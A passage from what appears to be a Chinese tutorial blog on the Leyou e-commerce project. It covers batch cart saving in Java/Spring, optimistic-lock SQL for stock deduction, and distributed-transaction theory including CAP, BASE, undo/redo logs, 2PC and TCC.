class="title function_">handleLoginCarts</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="批量新增购物车"><a href="#批量新增购物车" class="headerlink" title="批量新增购物车"></a>批量新增购物车</h4><p>刷新页面，可以看到请求已经发出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022715.png" alt="image-20200323224233503"></p>
<h5 id="controller-1"><a href="#controller-1" class="headerlink" title="controller"></a>controller</h5><p>分析一下请求：</p>
<ul>
<li>请求方式：POST</li>
<li>请求路径：&#x2F;cart&#x2F;list</li>
<li>请求参数：json数组，里面是cart对象</li>
<li>返回结果，应该是void</li>
</ul>
<p>我们在<code>ly-trade</code>的<code>com.leyou.trade.web</code>包中的<code>CartController</code>中添加新的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">     * 批量添加购物车</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">addCartItemList</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;CartItem&gt; itemList)</span> &#123;</span><br><span class="line">    cartService.addCartItemList(itemList);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.CREATED).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service</code>包中<code>CartService</code>接口添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 批量新增购物车商品</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItemList 购物车商品列表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addCartItemList</span><span class="params">(List&lt;CartItem&gt; cartItemList)</span>;</span><br></pre></td></tr></table></figure>



<p>批量新增，其实就是循环把集合中的每个购物车商品添加到redis。因此这里可以调用之前 单商品新增的逻辑。</p>
<p>首先把单商品新增的代码封装为一个方法。</p>
<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service.impl</code>包中<code>CartServiceImpl</code>实现类中添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> CartItem <span class="title function_">saveOrUpdateCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.先获取之前的购物车数据</span></span><br><span class="line">    Optional&lt;CartItem&gt; optional = repository.findById(cartItem.getSkuId());</span><br><span class="line">    <span class="comment">// 2.判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span>(optional.isPresent())&#123;</span><br><span class="line">        <span class="comment">// 2.1.存在，记录新的商品数量</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> cartItem.getNum();</span><br><span class="line">        <span class="comment">// 2.2.获取旧的数据</span></span><br><span class="line">        cartItem = optional.get();</span><br><span class="line">        <span class="comment">// 2.3.数量累加</span></span><br><span class="line">        cartItem.setNum(num + cartItem.getNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cartItem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法就是判断购物车商品是否存在，存在则修改数量，不存在则原样返回。</p>
<p>看下之前的单商品新增：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.判断购物车商品是否存在，并完成处理</span></span><br><span class="line">    cartItem = saveOrUpdateCartItem(cartItem);</span><br><span class="line">    <span class="comment">// 2.写入db</span></span><br><span class="line">    repository.save(cartItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>批量新增的业务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCartItemList</span><span class="params">(List&lt;CartItem&gt; cartItemList)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.批量对购物车商品做判断和处理</span></span><br><span class="line">    List&lt;CartItem&gt; list = cartItemList.stream()</span><br><span class="line">        .map(<span class="built_in">this</span>::saveOrUpdateCartItem).collect(Collectors.toList());</span><br><span class="line">    <span class="comment">// 2.批量写入mongoDB</span></span><br><span class="line">    repository.saveAll(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="下单功能"><a href="#下单功能" class="headerlink" title="下单功能"></a>下单功能</h1><h2 id="订单数据结构"><a href="#订单数据结构" class="headerlink" title="订单数据结构"></a>订单数据结构</h2><p>加入购物车后，自然就要完成用户下单，订单属于对事务要求较高的业务，肯定不能写入MongoDB，应该写入MySQL数据库中。</p>
<p>订单表, 物流信息表,订单条目</p>
<h3 id="整合MybatisPlus"><a href="#整合MybatisPlus" class="headerlink" title="整合MybatisPlus"></a>整合MybatisPlus</h3><p>需要注意的地方：</p>
<ul>
<li>id类型：这里是<code>@TableId(type = IdType.ASSIGN_ID)</code>，代表是自动生成ID，id生成算法是由MybatisPlus内置的雪花算法（SnowFlake，由Twitter公司开源）</li>
<li>订单状态：订单状态包含多个，在数据库中是数字，不太方便记忆。为了避免出错，这里我们使用了枚举<code>OrderStatus</code></li>
</ul>
<h2 id="订单结算页"><a href="#订单结算页" class="headerlink" title="订单结算页"></a>订单结算页</h2><h3 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h3><h2 id="创建订单接口"><a href="#创建订单接口" class="headerlink" title="创建订单接口"></a>创建订单接口</h2><p>订单详情包括的数据有：</p>
<ul>
<li>订单id：在订单新增以后，就会回显id</li>
<li>商品相关：<ul>
<li>商品id：页面提交了</li>
<li>购买数量num：页面提交了</li>
<li>商品价格、图片、spec、标题：需要根据商品id到商品微服务查询</li>
</ul>
</li>
</ul>
<p>问题：为什么不让页面直接把商品价格、图片、spec、标题都提交到服务端，而是只提交了商品id？</p>
<p>答：为了安全考虑，商品价格等敏感信息由客户端提交存在风险。</p>
<h3 id="减库存"><a href="#减库存" class="headerlink" title="减库存"></a>减库存</h3><ul>
<li><p>支付减库存？</p>
<ul>
<li>优点：用户付款，才会减库存，可以确定用户一定有购买意图，不会出现恶意下单导致的库存堆积</li>
<li>缺点：可能用户付款后，发现库存不足，用户体验差</li>
</ul>
</li>
<li><p>下单减库存</p>
<ul>
<li>优点：下单就预留库存，用户付款一定能拿到商品，体验比较好</li>
<li>缺点：如果用户下单，不付款，会占用商家库存，导致它人无法购买</li>
</ul>
</li>
</ul>
<p>我们需要根据不同的场景去做选择，如果更在意用户体验，应该选择下单减库存！但是如何应对下单减库存的缺点呢？</p>
<ul>
<li>超时未支付的订单需要关闭</li>
<li>限定每个用户每天可以取消订单的次数</li>
</ul>
<h4 id="减库存安全问题"><a href="#减库存安全问题" class="headerlink" title="减库存安全问题"></a>减库存安全问题</h4><p>上面这样的操作存在线程安全的风险，因为我们的代码是允许在多线程环境的，当多个用户并发访问时，先判断库存是否充足，然后再执行减库存，会出现一种情况：判断的时候，库存是充足的，但是在减库存之前，有其它线程抢先一步，扣减库存，导致库存不足了，此时就会出现超卖现象！</p>
<h4 id="思路一-同步锁"><a href="#思路一-同步锁" class="headerlink" title="思路一: 同步锁"></a>思路一: 同步锁</h4><p>我们一般需要加同步锁，synchronized，目的是让多线程串行执行，从而保证线程安全，但是加synchronized只能保证在当前JVM内的线程安全。</p>
<p>如果是搭建一个微服务集群，同步锁synchronized就失效了。原因是因为线程锁，在多进程时会失效，因为每个进程都有自己的锁。</p>
<p>解决多进程安全问题，必须使用进程锁(分布式锁),这种方案需要额外实现一个分布式锁功能,比较麻烦;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022716.png" alt="image-20210415142201086"></p>
<h4 id="思路二-数据库排它锁"><a href="#思路二-数据库排它锁" class="headerlink" title="思路二: 数据库排它锁"></a>思路二: 数据库排它锁</h4><p>数据库锁简单来说有两种：</p>
<ul>
<li>共享锁：读操作时会开启共享锁，此时大家都可以查询</li>
<li>排它锁（互斥锁）：一般是写操作会开启排它锁，此时其它事务无法获取共享锁或排它锁，会阻塞</li>
</ul>
<p>要保证安全，必须加排它锁。</p>
<p>但是我们之前的业务是先查询sku（读），然后判断是否充足，然后减库存（写），这样就会导致多个请求同时查询到一样的库存，减库存还是有安全问题。</p>
<p>我们必须在查询时就加排它锁，怎么办？</p>
<p>可以通过select … for update语法来开启，但是我们要加锁的商品不止一个，此时加锁就是范围锁，甚至是表锁，性能会有较大的影响</p>
<h4 id="思路三-乐观锁"><a href="#思路三-乐观锁" class="headerlink" title="思路三: 乐观锁"></a>思路三: 乐观锁</h4><p>上述思路1和思路2都是加锁，实现互斥，保证线程安全，我们称为悲观锁。</p>
<ul>
<li>悲观锁：认为线程安全问题一定会发生，因此会加锁保证线程串行执行，从而保证安全。</li>
</ul>
<p>我们为了追求性能，可以使用乐观锁机制。</p>
<ul>
<li>乐观锁：认为线程安全问题不一定会发生，因此允许多线程并行执行，一般会在执行那一刻进行判断和比较，然后根据是否存在风险来决定是否执行操作,乐观锁就是先比较再执行的思路，其实就是CAS（compare and set）的思想。JDK的JUC包下的AtomicInteger、AtomicLong等; Redis的watch,也是乐观锁,CAS原理;</li>
</ul>
<p>简化: 我们在减库存中,可以用stock来代替version,执行sql时,判断stock是否跟自己查询到的一样</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>继续简化: 我们可以不查询库存,直接执行sql,在sql语句中做判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">&gt;=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>继续简化: 我们最终的目的是库存不能超卖,不能为负数,因此我们可以设置stock字段为无符号整数,数据库会自动对写入的数据判断,如果为负,会抛出异常,我们就无需加锁或其他任何判断.</p>
<h2 id="查询订单接口"><a href="#查询订单接口" class="headerlink" title="查询订单接口"></a>查询订单接口</h2><h1 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h1><h2 id="什么是分布式事务"><a href="#什么是分布式事务" class="headerlink" title="什么是分布式事务?"></a>什么是分布式事务?</h2><h3 id="本地事务"><a href="#本地事务" class="headerlink" title="本地事务"></a>本地事务</h3><p>事务: 是指传统的单机数据库事务,必须具备ACID原则; 在传统的项目中,项目的部署基本是单点式: 即单个服务器和单个数据库. 这种情况下数据库本身的事务机制就能保证ACID原则,这样的事务就是本地事务. 单个服务和单个数据库的架构中,产生的事务都是本地事务.</p>
<h3 id="分布式事务-1"><a href="#分布式事务-1" class="headerlink" title="分布式事务"></a>分布式事务</h3><p>跨数据源的分布式事务, 跨服务的分布式事务</p>
<h4 id="跨数据源"><a href="#跨数据源" class="headerlink" title="跨数据源"></a>跨数据源</h4><p>对数据库进行了水平拆分,将原单库单表拆分成数据库分片,于是产生了跨数据库事务问题</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022717.png" alt="image-20210415144156443"></p>
<h4 id="跨服务"><a href="#跨服务" class="headerlink" title="跨服务"></a>跨服务</h4><p>在业务发展初期，“一块大饼”的单业务系统架构，能满足基本的业务需求。但是随着业务的快速发展，系统的访问量和业务复杂程度都在快速增长，单系统架构逐渐成为业务发展瓶颈，解决业务系统的高耦合、可伸缩问题的需求越来越强烈。</p>
<p>如下图所示，按照面向服务（SOA,SOA粗暴理解：把系统按照实际业务，拆分成刚刚好大小的、合适的、独立部署的模块，每个模块之间相互独立。）的架构的设计原则，将单业务系统拆分成多个业务系统，降低了各系统之间的耦合度，使不同的业务系统专注于自身业务，更有利于业务的发展和系统容量的伸缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022718.png" alt="image-20210415144342697"></p>
<h4 id="分布式系统的数据一致性问题"><a href="#分布式系统的数据一致性问题" class="headerlink" title="分布式系统的数据一致性问题"></a>分布式系统的数据一致性问题</h4><p>在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。在分布式网络环境下，我们无法保障所有服务、数据库都百分百可用，一定会出现部分服务、数据库执行成功，另一部分执行失败的问题。</p>
<p>当出现部分业务操作成功、部分业务操作失败时，业务数据就会出现不一致。</p>
<p>例如电商行业中比较常见的下单付款案例，包括下面几个行为：</p>
<ul>
<li>创建新订单</li>
<li>扣减商品库存</li>
<li>从用户账户余额扣除金额</li>
</ul>
<p>完成上面的操作需要访问三个不同的微服务和三个不同的数据库。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022719.png" alt="image-20200304204442839"></p>
<p>在分布式环境下，肯定会出现部分操作成功、部分操作失败的问题，比如：订单生成了，库存也扣减了，但是 用户账户的余额不足，这就造成数据不一致。</p>
<p>订单的创建、库存的扣减、账户扣款在每一个服务和数据库内是一个本地事务，可以保证ACID原则。</p>
<p>但是当我们把三件事情看做一个事情事，要满足保证“业务”的原子性，要么所有操作全部成功，要么全部失败，不允许出现部分成功部分失败的现象，这就是分布式系统下的事务了。</p>
<p>此时ACID难以满足，这是分布式事务要解决的问题</p>
<h2 id="解决分布式事务的思路"><a href="#解决分布式事务的思路" class="headerlink" title="解决分布式事务的思路"></a>解决分布式事务的思路</h2><h3 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h3><p>Consistency(一致性), Availability(可用性), Partition Tolerance(分区容错性); 这个三个指标不可能同时完成, 这个结论就叫做CAP定理;</p>
<p>舍弃容错性。但是这也就意味着你的系统不是分布式的了，因为涉及分布式的想法就是把功能分开，部署到不同的机器上。</p>
<h3 id="Base理论"><a href="#Base理论" class="headerlink" title="Base理论"></a>Base理论</h3><p>Basically Available(基本可用), Soft state(软状态), Eventually consistent(最终一致性)</p>
<h4 id="基本可用"><a href="#基本可用" class="headerlink" title="基本可用"></a>基本可用</h4><p><strong>响应时间上的损失</strong>：正常情况下的搜索引擎0.5秒即返回给用户结果，而基本可用的搜索引擎可以在2秒作用返回结果。</p>
<p><strong>功能上的损失</strong>：在一个电商网站上，正常情况下，用户可以顺利完成每一笔订单。但是到了大促期间，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。</p>
<h4 id="软状态"><a href="#软状态" class="headerlink" title="软状态"></a>软状态</h4><p>什么是软状态呢？相对于原子性而言，要求多个节点的数据副本都是一致的，这是一种“硬状态”。</p>
<p>软状态指的是：允许系统中的数据存在中间状态，并认为该状态不影响系统的整体可用性，即允许系统在多个不同节点的数据副本存在数据延时。</p>
<h4 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h4><p>上面说软状态，然后不可能一直是软状态，必须有个时间期限。在期限过后，应当保证所有副本保持数据一致性，从而达到数据的最终一致性。这个时间期限取决于网络延时、系统负载、数据复制方案设计等等因素。</p>
<p>而在实际工程实践中，最终一致性分为5种：</p>
<p>因果一致性（Causal consistency）</p>
<p>因果一致性指的是：如果节点A在更新完某个数据后通知了节点B，那么节点B之后对该数据的访问和修改都是基于A更新后的值。于此同时，和节点A无因果关系的节点C的数据访问则没有这样的限制。</p>
<p>读己之所写（Read your writes）</p>
<p>读己之所写指的是：节点A更新一个数据后，它自身总是能访问到自身更新过的最新值，而不会看到旧值。其实也算一种因果一致性。</p>
<p>会话一致性（Session consistency）</p>
<p>会话一致性将对系统数据的访问过程框定在了一个会话当中：系统能保证在同一个有效的会话中实现 “读己之所写” 的一致性，也就是说，执行更新操作之后，客户端能够在同一个会话中始终读取到该数据项的最新值。</p>
<p>单调读一致性（Monotonic read consistency）</p>
<p>单调读一致性指的是：如果一个节点从系统中读取出一个数据项的某个值后，那么系统对于该节点后续的任何数据访问都不应该返回更旧的值。</p>
<p>单调写一致性（Monotonic write consistency）</p>
<p>单调写一致性指的是：一个系统要能够保证来自同一个节点的写操作被顺序的执行。</p>
<p>在实际的实践中，这5种系统往往会结合使用，以构建一个具有最终一致性的分布式系统。</p>
<p>实际上，不只是分布式系统使用最终一致性，关系型数据库在某个功能上，也是使用最终一致性的。比如备份，数据库的复制过程是需要时间的，这个复制过程中，业务读取到的值就是旧的。当然，最终还是达成了数据一致性。这也算是一个最终一致性的经典案例。</p>
<p>小结</p>
<p>总体来说BASE理论面向的是大型高可用、可扩展的分布式系统。与传统ACID特性相反，不同于ACID的强一致性模型，BASE提出通过牺牲强一致性来获得可用性，并允许数据段时间内的不一致，但是最终达到一致状态。同时，在实际分布式场景中，不同业务对数据的一致性要求不一样。因此在设计中，ACID和BASE理论往往又会结合使用。</p>
<p>而我们解决分布式事务，就是根据Base理论和CAP理论来实现。</p>
<p>还以上面的下单减库存和扣款为例：</p>
<p>订单服务、库存服务、用户服务及他们对应的数据库就是分布式应用中的三个部分。</p>
<ul>
<li><p>CP方式：现在如果要满足事务的强一致性，就必须在订单服务数据库锁定的同时，对库存服务、用户服务数据资源同时锁定。等待三个服务业务全部处理完成，才可以释放资源。此时如果有其他请求想要操作被锁定的资源就会被阻塞，这样就是满足了CP。</p>
<p>这就是强一致，弱可用</p>
</li>
<li><p>AP方式：三个服务的对应数据库各自独立执行自己的业务，执行本地事务，不要求互相锁定资源。但是这个中间状态下，我们去访问数据库，可能遇到数据不一致的情况，不过我们需要做一些后补措施，保证在经过一段时间后，数据最终满足一致性。</p>
<p>这就是高可用，但弱一致（最终一致）。</p>
</li>
</ul>
<p>由上面的两种思想，延伸出了很多的分布式事务解决方案：</p>
<ul>
<li>XA</li>
<li>TCC</li>
<li>可靠消息最终一致</li>
<li>TA</li>
</ul>
<p>不过，要想搞懂这些原理，你必须知道数据库本地事务是如何实现的，也就是undo和redo日志的故事。</p>
<h3 id="undo和redo"><a href="#undo和redo" class="headerlink" title="undo和redo"></a>undo和redo</h3><p>在数据库系统中，既有存放数据的文件，也有存放日志的文件。日志在内存中也是有缓存Log buffer，也有磁盘文件log file。MySQL中的日志文件，有这么两类与事务有关：undo日志与redo日志。</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>持久性和原子性可以利用undo log来实现</p>
<p>原理: 为了满足事务的原子性,在操作任何数据之前,首先将数据备份到undo log. 然后进行数据的修改. 如果出现了错误或者用户执行了ROLLBACK语句,系统可以利用Undo log 中的备份数据将数据恢复到事务开始之前的状态.</p>
<p>数据库写入数据到磁盘之前, 会把数据先缓存在内存中,事务提交时才会写入磁盘中.</p>
<p>用undo log 实现原子性和持久性的事务的简化过程: </p>
<p>假设有A、B两个数据,值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录B&#x3D;2到undo log buffer.<br> E. 修改B&#x3D;4.<br> F. 将undo log buffer写到磁盘。<br> G. 将数据写到磁盘。<br> H. 事务提交</p>
<ul>
<li><p>如何保证原子性？</p>
<p>在修改数据到磁盘前，会先记录undo log，并将undo log持久化到硬盘</p>
</li>
<li><p>如何保证持久性？</p>
<p>在事务提交之前，把内存中缓存的数据写入磁盘。这样事务提交时，可以确定数据是已经持久化的，不会丢失。</p>
</li>
<li><p>若系统在G和H之间崩溃</p>
<p>此时事务并未提交，需要回滚。而undo log已经被持久化，可以根据undo log来恢复数据</p>
</li>
<li><p>若系统在G之前崩溃</p>
<p>此时数据并未持久化到硬盘，依然保持在事务之前的状态</p>
</li>
</ul>
<p><strong>缺陷：</strong>每个事务提交前将数据和Undo Log写入磁盘，这样会导致大量的磁盘IO，因此性能很低。</p>
<p>如果能够将数据缓存一段时间，就能减少IO提高性能。但是这样就会丧失事务的持久性。因此引入了另外一种机制来实现持久化，即<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>和Undo Log相反，Redo Log记录的是<strong>新数据</strong>的备份。<strong>在事务提交前，只要将Redo Log持久化即可，不需要将数据持久化，减少了IO的次数。</strong></p>
<p>先来看下基本原理：</p>
<blockquote>
<p><strong>Undo + Redo事务的简化过程</strong></p>
</blockquote>
<p> 假设有A、B两个数据，值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log.<br> C. 修改A&#x3D;3.<br> D. 记录A&#x3D;3到redo log.<br> E. 记录B&#x3D;2到undo log.<br> F. 修改B&#x3D;4.<br> G. 记录B&#x3D;4到redo log.<br> H. 将undo log写入redo log<br> I. 将redo log写入磁盘<br> J. 事务提交</p>
<blockquote>
<p>安全和性能问题</p>
</blockquote>
<ul>
<li><p>如何保证原子性？</p>
<p>如果在事务提交前故障，通过undo log日志恢复数据。如果undo log都还没写入，那么数据就尚未持久化，无需回滚</p>
</li>
<li><p>如何保证持久化？</p>
<p>大家会发现，这里并没有出现数据的持久化。因为数据已经写入redo log，而redo log持久化到了硬盘，因此只要到了I以后，事务是可以提交的。</p>
</li>
<li><p>内存中的数据库数据何时持久化到磁盘？</p>
<p>因为redo log已经持久化，因此数据库数据写入磁盘与否影响不大，不过为了避免出现脏数据（内存中与磁盘不一致），事务提交后也会将内存数据刷入磁盘（也可以按照固设定的频率刷新内存数据到磁盘中）。</p>
</li>
<li><p>持久化redo和持久化数据库数据有什么性能差异？</p>
<ul>
<li><p>数据库数据写入是随机IO，性能很差</p>
</li>
<li><p>redo log在初始化时会开辟一段连续的空间，写入是顺序IO，性能很好</p>
</li>
</ul>
</li>
<li><p>redo log中记录的数据，有可能尚未提交，那么如何完成数据恢复？</p>
<p>数据恢复有两种策略：</p>
<ul>
<li>恢复时，只重做已经提交了的事务</li>
<li>恢复时，重做所有事务包括未提交的事务和回滚了的事务。然后通过Undo Log回滚那些未提交的事务</li>
</ul>
<p>Inodb引擎采用的是第二种方案，因此undo log要在 redo log前持久化</p>
</li>
<li><p>写入性能的优化</p>
<p>事务提交前需要同时写入undo log和 redo log，势必增加IO次数，因此实际上undo log并不是直接写入磁盘，而是先写入到redo log中，当redo log持久化时，undo log就同时持久化到硬盘了。</p>
<p>因此事务提交前，只需要对redo log持久化即可。</p>
<p>另外，redo log并不是写入一次就持久化一次，redo log在内存中也有自己的缓冲池：<code>redo log buffer</code>。每次写redo log都是写入到buffer，在提交时一次性持久化到磁盘，减少IO此时。</p>
</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>最后总结一下：</p>
<ul>
<li>undo log 记录更新前数据，用于保证事务原子性</li>
<li>redo log 记录更新后数据，用于保证事务的持久性</li>
<li>redo log有自己的内存buffer，先写入到buffer，事务提交时写入磁盘</li>
<li>redo log持久化之后，意味着事务是<strong>可提交</strong>的</li>
</ul>
<h3 id="分阶段提交"><a href="#分阶段提交" class="headerlink" title="分阶段提交"></a>分阶段提交</h3><h4 id="DTP和XA"><a href="#DTP和XA" class="headerlink" title="DTP和XA"></a>DTP和XA</h4><p>分布式事务的解决手段之一，就是两阶段提交协议（2PC：Two-Phase Commit）</p>
<p>那么到底什么是两阶段提交协议呢？</p>
<p>1994 年，X&#x2F;Open 组织（即现在的 Open Group ）定义了分布式事务处理的DTP 模型。该模型包括这样几个角色：</p>
<ul>
<li>应用程序（ AP,Application ）：我们的微服务</li>
<li>事务管理器（ TM, Transction Manager）：全局事务管理者</li>
<li>资源管理器（ RM, Resource Manager ）：一般是数据库</li>
<li>通信资源管理器（ CRM, Communication Resource Manager）：是TM和RM间的通信中间件</li>
</ul>
<p>在该模型中，一个分布式事务（全局事务）可以被拆分成许多个本地事务，运行在不同的AP和RM上。每个本地事务的ACID很好实现，但是全局事务必须保证其中包含的每一个本地事务都能同时成功，若有一个本地事务失败，则所有其它事务都必须回滚。但问题是，本地事务处理过程中，并不知道其它事务的运行状态。因此，就需要通过CRM来通知各个本地事务，同步事务执行的状态。</p>
<p>因此，各个本地事务的通信必须有统一的标准，否则不同数据库间就无法通信。<strong>XA</strong>就是 X&#x2F;Open DTP中通信中间件与TM间联系的<strong>接口规范</strong>，定义了用于通知事务开始、提交、终止、回滚等接口，各个数据库厂商都必须实现这些接口。</p>
<h4 id="二阶段提交"><a href="#二阶段提交" class="headerlink" title="二阶段提交"></a>二阶段提交</h4><p>2PC：Two-Phase(feis) Commit）</p>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/35298019">漫话分布式系统共识协议: 2PC&#x2F;3PC篇</a></p>
<p><strong>二阶提交协议</strong>就是根据这一思想衍生出来的，将全局事务拆分为两个阶段来执行：</p>
<ul>
<li>阶段一：准备阶段，各个本地事务完成本地事务的准备工作。</li>
<li>阶段二：执行阶段，各个本地事务根据上一阶段执行结果，进行提交或回滚。</li>
</ul>
<p>这个过程中需要一个协调者（coordinator），还有事务的参与者（voter）。</p>
<blockquote>
<p>1）正常情况</p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022720.png" alt="image-20200305141029973"> </p>
<p><strong>投票阶段</strong>：协调组询问各个事务参与者，是否可以执行事务。每个事务参与者执行事务，写入redo和undo日志，然后反馈事务执行成功的信息（<code>agree</code>）</p>
<p><strong>提交阶段</strong>：协调组发现每个参与者都可以执行事务（<code>agree</code>），于是向各个事务参与者发出<code>commit</code>指令，各个事务参与者提交事务。</p>
<blockquote>
<p>2）异常情况</p>
</blockquote>
<p>当然，也有异常的时候：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022721.png" alt="image-20200305141318326"> </p>
<p><strong>投票阶段</strong>：协调组询问各个事务参与者，是否可以执行事务。每个事务参与者执行事务，写入redo和undo日志，然后反馈事务执行结果，但只要有一个参与者返回的是<code>Disagree</code>，则说明执行失败。</p>
<p><strong>提交阶段</strong>：协调组发现有一个或多个参与者返回的是<code>Disagree</code>，认为执行失败。于是向各个事务参与者发出<code>abort</code>指令，各个事务参与者回滚事务。</p>
<blockquote>
<p>3）缺陷</p>
</blockquote>
<p>二阶段提交的问题：</p>
<ul>
<li><p>单点故障问题</p>
<p>2PC的缺点在于不能处理fail-stop形式的节点failure. 比如下图这种情况.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022722.png" alt="image-20200305142812815"> </p>
<p>假设coordinator和voter3都在Commit这个阶段crash了, 而voter1和voter2没有收到commit消息. 这时候voter1和voter2就陷入了一个困境. 因为他们并不能判断现在是两个场景中的哪一种:</p>
<p> (1)上轮全票通过然后voter3第一个收到了commit的消息并在commit操作之后crash了</p>
<p> (2)上轮voter3反对所以干脆没有通过.</p>
</li>
<li><p>阻塞问题</p>
<p>在准备阶段、提交阶段，每个事物参与者都会锁定本地资源，并等待其它事务的执行结果，阻塞时间较长，资源锁定时间太久，因此执行的效率就比较低了。</p>
</li>
</ul>
<p>面对二阶段提交的上述缺点，后来又演变出了三阶段提交，但是依然没有完全解决阻塞和资源锁定的问题，而且引入了一些新的问题，因此实际使用的场景较少。对事务有强一致性要求,对事务的执行效率不敏感,并且不希望有太多的代码侵入.</p>
<h3 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h3><p>Try-confirm-cancel</p>
<p>TCC模式可以解决2PC中的资源锁定和阻塞问题，减少资源锁定时间。它采用的是一种补偿型事务的思想。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>它本质是一种补偿的思路。事务运行过程包括三个方法，</p>
<ul>
<li>Try：资源的检测和预留；</li>
<li>Confirm：执行的业务操作提交；要求 Try 成功 Confirm 一定要能成功；</li>
<li>Cancel：预留资源释放。</li>
</ul>
<p>执行分两个阶段：</p>
<ul>
<li>准备阶段（try）：资源的检测和预留；</li>
<li>执行阶段（confirm&#x2F;cancel）：根据上一步结果，判断下面的执行方法。如果上一步中所有事务参与者都成功，则这里执行confirm。反之，执行cancel</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022723.png" alt="image-20200305155521612"> </p>
<p>粗看似乎与两阶段提交没什么区别，但其实差别很大：</p>
<ul>
<li>try、confirm、cancel都是独立的事务，不受其它参与者的影响，不会阻塞等待它人</li>
<li>try、confirm、cancel由程序员在业务层编写，锁粒度有代码控制</li>
</ul>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>我们以之前的下单业务中的扣减余额为例来看下三个不同的方法要怎么编写，假设账户A原来余额是100，需要余额扣减30元。如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022724.png" alt="image-20200305155830732"></p>
<ul>
<li><p>一阶段（Try）：余额检查，并冻结用户部分金额，此阶段执行完毕，事务已经提交</p>
<ul>
<li>检查用户余额是否充足，如果充足，冻结部分余额</li>
